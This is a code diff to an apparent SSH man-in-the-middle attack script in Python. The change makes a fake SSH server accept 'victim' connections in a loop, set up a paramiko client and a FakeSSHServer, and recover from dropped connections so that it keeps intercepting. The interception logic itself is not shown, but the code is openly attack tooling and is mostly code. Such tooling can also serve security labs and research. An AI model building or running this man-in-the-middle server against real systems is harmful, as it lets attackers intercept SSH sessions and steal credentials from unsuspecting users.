@@ -236,24 +236,34 @@ def start_mitm_server():
     fake_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     fake_server_socket.bind((MITM_HOST, MITM_PORT))
     fake_server_socket.listen(5)
+    
+    while True:
+        try:
+            logging.info(f"[*] Waiting for connections on {MITM_HOST}:{MITM_PORT}")
+            victim_socket, addr = fake_server_socket.accept()
+            logging.info(f"[*] Victim connected from {addr}")
 
-    try:
-        logging.info(f"[*] Waiting for connections on {MITM_HOST}:{MITM_PORT}")
-        victim_socket, addr = fake_server_socket.accept()
-        logging.info(f"[*] Victim connected from {addr}")
+            # create an fake SSH client
+            fakeClient = paramiko.SSHClient()
 
-        # create an fake SSH client
-        fakeClient = paramiko.SSHClient()
+            # handle SSH handshake with the victim
+            fakeServer = FakeSSHServer(victim_socket, fakeClient)  # Simulate an SSH server
+            handle_client(victim_socket, fakeServer, fakeClient)
 
-        # Handle SSH handshake with the victim
-        fakeServer = FakeSSHServer(victim_socket, fakeClient)  # Simulate an SSH server
-        handle_client(victim_socket, fakeServer, fakeClient)
-
-    except KeyboardInterrupt:
-        logging.info(f"[*] Interrupted by user. Closing server socket.")
-    finally:
-        fake_server_socket.close()
-        logging.info(f"[*] Server socket closed.")
+        except EOFError:
+            victim_socket.close()
+            logging.error("[*] Connection closed by the client (EOFError).")
+            continue
+        except ConnectionResetError as cre:
+            victim_socket.close()
+            logging.error(f"Connection was reset by the peer: {cre}")
+            continue
+        except KeyboardInterrupt:
+            logging.info(f"[*] Interrupted by user. Closing server socket.")
+            break
+    
+    fake_server_socket.close()
+    logging.info(f"[*] Server socket closed.")
 
 if __name__ == "__main__":
     start_mitm_server()
